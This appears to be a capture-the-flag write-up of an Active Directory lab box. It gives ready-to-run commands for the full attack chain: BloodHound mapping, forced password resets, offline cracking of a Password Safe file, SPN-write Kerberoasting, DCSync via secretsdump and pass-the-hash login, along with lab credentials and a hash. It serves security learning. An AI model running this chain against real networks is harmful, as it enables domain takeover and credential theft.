

**Box:** Administrator · **Domain:** administrator.htb · **DC:** DC.administrator.htb · **Given creds:** `Olivia : ichliebedich`

**Full chain (one line):**

Given creds (Olivia) → BloodHound → **Olivia `GenericAll` Michael** (change pw) → **Michael `ForceChangePassword` Benjamin** (change pw) → Benjamin has **FTP** → `Backup.psafe3` → crack with pwsafe2john (`tekieromucho`) → Password Safe reveals **emily / emma / alexander** → **Emily `GenericWrite` Ethan** → WriteSPN + Kerberoast Ethan (`limpbizkit`) → **Ethan has DCSync** → `secretsdump` → Administrator hash → evil-winrm = **Administrator**.

> This one is a clean "ACL chain" box — each user hands you control of the next via a BloodHound edge, until you reach a user with DCSync. The whole solve is: *collect → read the next edge → abuse it → repeat.*

---

## Phase 1 — Recon

```bash
nmap -p- --min-rate 10000 10.129.91.93        # then -sCV on open
```

Open: **21 FTP**, 53 DNS, 88 Kerberos, 389/3268 LDAP, 445 SMB, 5985 WinRM, high RPC. nxc:

```bash
nxc smb 10.129.91.93 -u Olivia -p 'ichliebedich'
```

→ SMB valid, **WinRM Pwn3d** for Olivia, hostname `DC`. Hosts entry:

```bash
echo '10.129.91.93 administrator.htb dc.administrator.htb DC' | sudo tee -a /etc/hosts
```

- **FTP:** anonymous login denied; Olivia has no FTP either (remember this — FTP becomes relevant later as a *different* user).
- **Shares:** only the defaults (IPC$, NETLOGON, SYSVOL); spider found nothing.
- **Olivia over WinRM:** nothing interesting in her profile.

So this is an AD-relationships box, not a files-lying-around box → straight to BloodHound.

---

## Phase 2 — BloodHound: map the ACL chain

```bash
bloodhound-python -d administrator.htb -u Olivia -p 'ichliebedich' -ns 10.129.91.93 -dc dc.administrator.htb -c All --zip
```

The graph lays out the whole path:
- **Olivia → `GenericAll` → Michael**
- **Michael → `ForceChangePassword` → Benjamin**
- Benjamin ∈ **Share Moderators** + Domain Users (looks like a dead end — but he has **FTP**)
- Separately, the DCSync target end: **Emily → `GenericWrite` → Ethan**, and **Ethan → `DCSync` → domain**.

So the plan writes itself: Olivia→Michael→Benjamin to get at **FTP**, find something that leads to **Emily**, then Emily→Ethan→**DCSync**→Administrator.

### What each edge means (quick reference)
| Edge | What it lets you do | Abuse |
|---|---|---|
| **GenericAll** | full control of the object | reset its password (or targeted Kerberoast / shadow creds) |
| **ForceChangePassword** | set its password without knowing the old one | `bloodyAD set password` |
| **GenericWrite** | write any non-protected attribute | write an SPN → **Kerberoast** |
| **DCSync** | replicate directory secrets | `secretsdump` → every hash |

---

## Phase 3 — Olivia → Michael → Benjamin (walk the chain)

**Olivia `GenericAll` Michael** → just reset Michael's password (I tried WriteSPN+Kerberoast first but the hash didn't crack, so take the direct route the ACL allows):

```bash
bloodyAD --host 10.129.91.93 -d administrator.htb -u Olivia -p 'ichliebedich' set password Michael 'NewPass123!'
nxc smb 10.129.91.93 -u Michael -p 'NewPass123!'     # [+] confirmed
```

**Michael `ForceChangePassword` Benjamin** → reset Benjamin:

```bash
bloodyAD --host 10.129.91.93 -d administrator.htb -u Michael -p 'NewPass123!' set password Benjamin 'NewPass123!'
```

Benjamin has **SMB + FTP** (no WinRM). Shares reveal nothing, so → **FTP** (the detail parked in Phase 1).

> **Note on "GenericAll → change password":** changing a password is loud and may break scored services on team engagements. On GenericAll, targeted **Kerberoast** or **shadow credentials** are quieter. Here cracking failed, so the password reset was the pragmatic call — it's a lab.

---

## Phase 4 — Benjamin (FTP) → Password Safe → Emily

In FTP as Benjamin there's one file: **`Backup.psafe3`** (a Password Safe v3 database). Download it, then crack its master password offline:

```bash
python /usr/share/john/pwsafe2john.py Backup.psafe3 > bbb
john bbb
```

→ master password **`tekieromucho`**. Open it with the real client:

```bash
sudo apt install passwordsafe && pwsafe      # open Backup.psafe3, enter tekieromucho
```

Three entries:

```
emma      : WwANQWnmJnGV07WQN8bMS7FMAbjNur
emily     : UXLCI5iETUsIBoFVTj8yQFKoHjXmb
alexander : UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
```

**Emily** is the one we care about (BloodHound said Emily→Ethan→DCSync). Validate first:

```bash
nxc smb 10.129.91.93 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'     # [+] valid
```

---

## Phase 5 — Emily → Ethan (GenericWrite → Kerberoast)

GenericWrite lets you **write an SPN** onto Ethan, making him kerberoastable:

```bash
bloodyAD --host 10.129.91.93 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' set object Ethan servicePrincipalName -v 'fake/yayay'

impacket-GetUserSPNs administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.129.91.93 -request-user Ethan
```

**Remember to change the SPN value each time** (`fake/yayay`, `fake/legit`, …). An SPN must be unique in the domain; reusing one that's still set elsewhere throws a constraint-violation error.

Crack the TGS:

```bash
hashcat -m 13100 ethan.tgs rockyou.txt
```

→ **`Ethan : limpbizkit`**. Validate:

```bash
nxc smb 10.129.91.93 -u ethan -p 'limpbizkit'        # smb works (winrm/rdp/ftp don't — doesn't matter)
```

---

## Phase 6 — Ethan DCSync → Administrator

Ethan holds **DCSync** (Get-Changes / Get-Changes-All), so replicate the Administrator secrets straight off the DC — no shell needed:

```bash
impacket-secretsdump administrator.htb/ethan:'limpbizkit'@dc.administrator.htb -dc-ip 10.129.91.93 -just-dc-user administrator
```
→
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
```

Pass-the-hash over WinRM — **target the FQDN, not the IP**:

```bash
evil-winrm -i 10.129.91.93 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e   # fails (IP)

evil-winrm -i dc.administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e   # works
```

 **Why the FQDN matters:** PtH to WinRM negotiates auth that resolves the host's SPN; the bare IP can fail SPN/negotiate while the FQDN succeeds. When `-H` "doesn't work," swap IP → FQDN before anything else.

→ **Administrator.** 👑 *(Solved this one solo — the only slip was almost skipping FTP and nearly waiting on the vault crack when the master password was quick.)*

---

## Full chain (one glance)

```
Olivia (given)
  │ GenericAll
Michael  ──(reset pw)
  │ ForceChangePassword
Benjamin ──(reset pw) → FTP → Backup.psafe3 → pwsafe2john → tekieromucho
  │ Password Safe
emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb
  │ GenericWrite → write SPN → Kerberoast
Ethan : limpbizkit
  │ DCSync
secretsdump → Administrator NT hash → evil-winrm (FQDN)  👑
```

## Takeaways

1. **No loot in shares + given creds = a BloodHound/ACL box.** Collect first, then walk the edges.
2. **Know the edge → know the abuse:** GenericAll = reset pw (or roast/shadow-creds), ForceChangePassword = `set password`, GenericWrite = write SPN → Kerberoast, DCSync = `secretsdump`.
3. **Park details that don't fit yet** — Benjamin's FTP meant nothing until it was the only place a file lived.
4. **Password Safe (`.psafe3`) → `pwsafe2john` + john**, then open with the `passwordsafe` client to read entries.
5. **Change the SPN value on every Kerberoast write** (SPNs must be unique).
6. **DCSync needs no shell** — one `secretsdump` from Linux with the right account dumps the hash.
7. **PtH failing over WinRM? Use the FQDN, not the IP.**
8. **Validate every cred with nxc before pivoting** — don't assume a looted entry is live or which user it's for.
